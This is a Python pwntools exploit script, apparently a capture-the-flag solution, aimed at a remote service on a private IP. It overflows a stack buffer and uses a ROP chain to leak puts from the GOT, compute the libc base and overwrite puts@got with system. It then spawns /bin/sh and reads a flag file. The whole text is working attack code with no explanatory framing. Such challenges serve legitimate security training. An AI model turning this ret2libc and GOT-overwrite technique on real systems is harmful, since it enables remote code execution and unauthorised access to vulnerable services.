from pwn import *
import time
context.arch = 'amd64'
r = remote('10.113.184.121', 10053)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
bss = 0x403400
#0x0000000000401263 : pop rdi ; ret
pop_rdi = 0x0000000000401263
#► 0x401090       <gets@plt>                        endbr64
#► 0x401070       <puts@plt>                        endbr64
#0x403368 <puts@got.plt>
gets_plt = 0x401090
puts_plt = 0x401070
puts_got = 0x403368
rop = flat([pop_rdi, puts_got,
            puts_plt,
            pop_rdi, bss,
            gets_plt,
            pop_rdi, puts_got,
            gets_plt,
            pop_rdi, bss,
            puts_plt])
payload = b'a' * 0x28 + rop
r.sendline(payload)
r.recvline()
puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
r.recvline()
libc.address = puts_addr - libc.sym['puts']
system_addr = libc.sym['system']
r.sendline(b'/bin/sh\x00')
r.sendline(p64(system_addr))
time.sleep(0.1)
r.sendline(b'cat /home/chal/flag.txt')
print(r.recvline())
r.close()